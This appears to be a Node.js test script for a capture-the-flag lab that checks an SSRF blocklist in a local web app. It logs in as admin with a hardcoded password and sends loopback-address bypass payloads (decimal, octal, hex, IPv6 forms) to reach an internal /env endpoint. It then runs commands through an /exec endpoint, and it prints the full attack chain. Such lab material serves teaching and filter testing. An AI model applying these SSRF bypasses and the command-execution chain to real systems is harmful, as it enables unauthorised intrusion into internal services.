#!/usr/bin/env node
/**
 * SSRF Vulnerability Test Script
 * Tests the SSRF filter bypass vulnerability
 */

const http = require('http');

console.log('=== SSRF Filter Bypass Test ===\n');

// Helper to make HTTP requests
function request(options, data = null) {
    return new Promise((resolve, reject) => {
        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
        });
        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
}

// Convert decimal IP to dotted notation for verification
function decimalToIP(decimal) {
    return [
        (decimal >>> 24) & 0xFF,
        (decimal >>> 16) & 0xFF,
        (decimal >>> 8) & 0xFF,
        decimal & 0xFF
    ].join('.');
}

async function testSSRF() {
    console.log('Prerequisites: Testing internal API is running...');
    try {
        const internalTest = await request({
            hostname: '127.0.0.1',
            port: 8181,
            path: '/',
            method: 'GET'
        });
        console.log('✓ Internal API is running on 127.0.0.1:8181');
        console.log('  Response:', internalTest.body.split('\n')[0]);
    } catch (e) {
        console.log('✗ Internal API not running. Start server first: npm start');
        return;
    }

    console.log('\nStep 1: Login as admin...');
    const loginResponse = await request({
        hostname: 'localhost',
        port: 3000,
        path: '/login',
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    }, 'username=admin&password=Admin@2024!');

    const sessionCookie = loginResponse.headers['set-cookie']?.[0]?.split(';')[0];
    if (!sessionCookie) {
        console.log('✗ Failed to login as admin');
        return;
    }
    console.log('✓ Logged in as admin');

    // Test blocklist blocks obvious payloads
    console.log('\n=== Test Blocklist (Should Block) ===\n');

    const blockedPayloads = [
        'http://localhost:8181/env',
        'http://127.0.0.1:8181/env',
        'http://0.0.0.0:8181/env',
        'http://[::1]:8181/env'
    ];

    for (const payload of blockedPayloads) {
        const data = `url=${encodeURIComponent(payload)}`;
        const response = await request({
            hostname: 'localhost',
            port: 3000,
            path: '/admin/fetch-report',
            method: 'POST',
            headers: {
                'Cookie': sessionCookie,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(data)
            }
        }, data);

        const isBlocked = response.body.includes('URL not allowed');
        if (isBlocked) {
            console.log(`✓ BLOCKED: ${payload}`);
        } else {
            console.log(`✗ NOT BLOCKED: ${payload} (expected to be blocked!)`);
        }
    }

    // Test bypass techniques
    console.log('\n=== Test Bypass Techniques (Should Work) ===\n');

    const bypassPayloads = [
        {
            name: 'Decimal IP notation',
            url: 'http://2130706433:8181/env',
            note: '2130706433 = 127.0.0.1 in decimal'
        },
        {
            name: 'Octal IP notation',
            url: 'http://0177.0.0.1:8181/env',
            note: '0177 = 127 in octal'
        },
        {
            name: 'IPv6 shorthand',
            url: 'http://[::]:8181/env',
            note: ':: = 0.0.0.0 (may resolve to localhost)'
        },
        {
            name: 'Mixed notation',
            url: 'http://0x7f.0.0.1:8181/env',
            note: '0x7f = 127 in hex'
        }
    ];

    let successfulBypasses = [];

    for (const payload of bypassPayloads) {
        console.log(`Testing: ${payload.name}`);
        console.log(`  URL: ${payload.url}`);
        console.log(`  Note: ${payload.note}`);

        const data = `url=${encodeURIComponent(payload.url)}`;
        try {
            const response = await request({
                hostname: 'localhost',
                port: 3000,
                path: '/admin/fetch-report',
                method: 'POST',
                headers: {
                    'Cookie': sessionCookie,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(data)
                }
            }, data);

            const isBlocked = response.body.includes('URL not allowed');
            const hasFlag = response.body.includes('FLAG_2');

            if (hasFlag) {
                console.log('  ✓ BYPASS SUCCESSFUL - Flag 2 captured!');
                successfulBypasses.push(payload.name);
            } else if (isBlocked) {
                console.log('  ✗ BLOCKED by filter');
            } else if (response.body.includes('Failed to fetch')) {
                console.log('  ⚠ Not blocked but fetch failed (network issue)');
            } else {
                console.log('  ⚠ Unexpected response');
            }
        } catch (e) {
            console.log(`  ✗ Error: ${e.message}`);
        }
        console.log();
    }

    // Test Flag 2 extraction
    if (successfulBypasses.length > 0) {
        console.log('=== Flag 2 Extraction ===\n');
        const bypassUrl = 'http://2130706433:8181/env';
        const data = `url=${encodeURIComponent(bypassUrl)}`;
        const response = await request({
            hostname: 'localhost',
            port: 3000,
            path: '/admin/fetch-report',
            method: 'POST',
            headers: {
                'Cookie': sessionCookie,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(data)
            }
        }, data);

        const flagMatch = response.body.match(/FLAG_2: (BTF\{[^}]+\})/);
        if (flagMatch) {
            console.log('✓ FLAG 2 CAPTURED:', flagMatch[1]);
        }

        const execHint = response.body.includes('/exec');
        if (execHint) {
            console.log('✓ Hint about /exec endpoint found in response');
        }
    }

    // Test Flag 3 via RCE
    if (successfulBypasses.length > 0) {
        console.log('\n=== Flag 3 Extraction (RCE) ===\n');
        const rceUrl = 'http://2130706433:8181/exec?cmd=whoami';
        const data = `url=${encodeURIComponent(rceUrl)}`;
        const response = await request({
            hostname: 'localhost',
            port: 3000,
            path: '/admin/fetch-report',
            method: 'POST',
            headers: {
                'Cookie': sessionCookie,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(data)
            }
        }, data);

        const flagMatch = response.body.match(/FLAG_3: (BTF\{[^}]+\})/);
        if (flagMatch) {
            console.log('✓ FLAG 3 CAPTURED:', flagMatch[1]);
            console.log('✓ RCE confirmed - command execution successful');
        } else {
            console.log('✗ Flag 3 not found');
        }
    }

    // Summary
    console.log('\n=== Test Summary ===\n');
    console.log('Blocklist Effectiveness:');
    console.log('  - Blocks obvious payloads: ✓ (localhost, 127.0.0.1, 0.0.0.0, ::1)');
    console.log('  - Vulnerable to bypass: ✓ (alternative IP representations)');
    console.log('\nSuccessful Bypass Techniques:', successfulBypasses.length > 0 ? successfulBypasses.join(', ') : 'None');
    console.log('\nAttack Chain:');
    console.log('1. Login as admin (via IDOR from Phase 4)');
    console.log('2. Access /admin/fetch-report');
    console.log('3. Bypass blocklist with decimal IP: http://2130706433:8181/env');
    console.log('4. Capture Flag 2 from /env response');
    console.log('5. Discover /exec endpoint from env dump');
    console.log('6. Execute commands: http://2130706433:8181/exec?cmd=<command>');
    console.log('7. Capture Flag 3 from RCE response');
}

// Run test
testSSRF().catch(err => {
    console.error('Error:', err.message);
    console.log('\nNote: Server must be running on localhost:3000');
    console.log('Start with: npm start');
});
